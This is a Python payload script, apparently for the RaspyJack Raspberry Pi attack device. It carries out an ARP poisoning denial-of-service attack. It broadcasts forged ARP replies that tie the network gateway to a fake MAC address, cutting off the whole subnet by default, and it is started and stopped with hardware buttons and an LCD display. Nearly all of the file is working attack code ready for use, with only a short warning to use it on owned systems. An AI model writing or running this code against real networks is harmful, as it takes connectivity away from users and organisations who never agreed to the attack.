#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: ARP Poisoning DoS**
========================================================
A Denial of Service attack that uses ARP poisoning to disrupt network
connectivity for a target or the entire network.

This payload works by sending forged ARP replies, mapping a critical IP
address (like the gateway) to a non-existent MAC address. This causes
traffic from hosts to be sent to a "black hole", effectively cutting
them off from the network or internet.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. It will disrupt the network. Use
with extreme caution and only on systems you own.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
# Leave TARGET_IP as "255.255.255.255" to poison the whole subnet
TARGET_IP = "255.255.255.255" 
FAKE_MAC = "00:11:22:33:44:55"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

# --- Globals & Shutdown ---
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
gateway_ip = None

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "ARP DoS", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# --- Attack Logic ---
def arp_dos_worker():
    global packet_count
    if not gateway_ip:
        print("Error: Gateway IP not found.", file=sys.stderr)
        return

    # op=2 means "is-at" (an ARP reply)
    # We are telling the TARGET_IP that the GATEWAY_IP is at FAKE_MAC
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gateway_ip, pdst=TARGET_IP, hwsrc=FAKE_MAC)
    
    while not attack_stop_event.is_set():
        sendp(p, iface="eth0", verbose=0)
        packet_count += 1
        time.sleep(1)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=arp_dos_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)
    # A real restore would involve sending correct ARP packets, but for a DoS, stopping is enough.

# --- Main Loop ---
try:
    is_attacking = False
    gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
    if not gateway_ip:
        draw_ui("No Gateway!")
        time.sleep(3)
        raise SystemExit("Could not determine gateway IP.")

    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED")
        
        start_wait = time.time()
        while time.time() - start_wait < 1.0:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    start_attack()
                else:
                    stop_attack()
                time.sleep(0.3)
                break
            time.sleep(0.05)
        if not running: break
except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("ARP DoS payload finished.")
